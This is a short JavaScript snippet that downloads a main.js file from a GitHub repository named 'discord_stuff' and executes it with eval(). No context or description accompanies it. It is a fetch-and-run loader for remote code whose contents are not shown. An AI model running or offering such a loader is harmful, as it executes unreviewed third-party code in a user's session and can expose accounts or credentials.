fetch(
  "https://raw.githubusercontent.com/jin-zhao-teh/discord_stuff/refs/heads/main/main.js"
)
  .then((r) => r.text())
  .then((code) => {
    eval(code);
  });
